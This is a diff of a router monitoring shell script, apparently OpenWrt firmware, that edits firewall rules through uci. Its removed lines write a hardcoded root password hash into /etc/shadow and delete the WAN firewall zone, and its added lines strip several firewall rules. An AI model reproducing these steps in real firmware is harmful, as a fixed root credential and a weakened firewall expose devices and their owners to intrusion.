@@ -1,8 +1,6 @@
 #!/bin/bash
 
-if [ "$(ps | grep -v grep | grep sysmonitor.sh | wc -l)" -gt 2 ]; then
-	exit 1
-fi
+[ "$(ps | grep sysmonitor.sh | grep -v grep | wc -l)" -gt 2 ] && exit
 
 sleep_unit=1
 NAME=sysmonitor
@@ -18,39 +16,22 @@ uci_set_by_name() {
 	uci commit $1
 }
 
-ping_url() {
-	local url=$1
-	for i in $( seq 1 3 ); do
-		status=$(ping -c 1 -W 1 $url | grep -o 'time=[0-9]*.*' | awk -F '=' '{print$2}'|cut -d ' ' -f 1)
-		[ "$status" == "" ] && status=0
-		[ "$status" != 0 ] && break
-	done
-	echo $status
-}
-
-cat /etc/shadow | grep root:::0:99999:7::: > /dev/null
-if [ $? -eq 0 ]; then
-	sed -i 's/root.*$/root:$1$TADtMues$II9qrw8S7H3hYtJASm0tw.:19059:0:99999:7:::/g' /etc/shadow
-fi
-
-m=$(cat /etc/config/firewall|grep "config zone"|wc -l)
+m=$(cat /etc/config/firewall|grep "config rule"|wc -l)
 let "m=m-1"
 for ((i=$m;i>=0;i--))
 do
-	[ $(uci get firewall.@zone[$i].name) == "wan" ] && uci del firewall.@zone[$i]	
+	[ "$(uci get firewall.@rule[$i].name)" == "Allow-IPSec-ESP" ] && uci del firewall.@rule[$i]
+	[ "$(uci get firewall.@rule[$i].name)" == "Allow-ISAKMP" ] && uci del firewall.@rule[$i]
+	[ "$(uci get firewall.@rule[$i].name)" == "Support-UDP-Traceroute" ] && uci del firewall.@rule[$i]
 done
+
 m=$(cat /etc/config/firewall|grep "config forwarding"|wc -l)
 let "m=m-1"
 for ((i=$m;i>=0;i--))
 do
-	uci del firewall.@forwarding[$i]
+	[ "$(uci get firewall.@forwarding[$i].src)" == "lan" ] && uci del firewall.@forwarding[$i]
 done
 uci commit firewall
-cat >> /etc/config/firewall <<EOF
-config forwarding
-	option src 'wghome'
-	option dest 'lan'
-EOF
 /etc/init.d/firewall restart >/dev/null 2>&1 &
 
 path=$(ls /mnt|grep mmc|grep 4)
@@ -76,10 +57,11 @@ while [ "1" == "1" ]; do #死循环
 		echo $ipv6 | cut -d'/' -f1 |head -n1 > /www/ip6.html
 	}
 
-	[ $(uci_get_by_name $NAME sysmonitor enable 0) == 0 ] && exit 0
-
+	[ "$(ps |grep lighttpd|grep -v grep|wc -l)" == 0 ] && /etc/init.d/lighttpd start
 	num=0
-	while [ $num -le 10 ]; do
+	check_time=$(uci_get_by_name $NAME sysmonitor time 10)
+	[ "$check_time" -le 3 ] && check_time=3
+	while [ $num -le $check_time ]; do
 		sleep $sleep_unit
 		[ $(uci_get_by_name $NAME sysmonitor enable 0) == 0 ] && exit 0
 		let num=num+sleep_unit
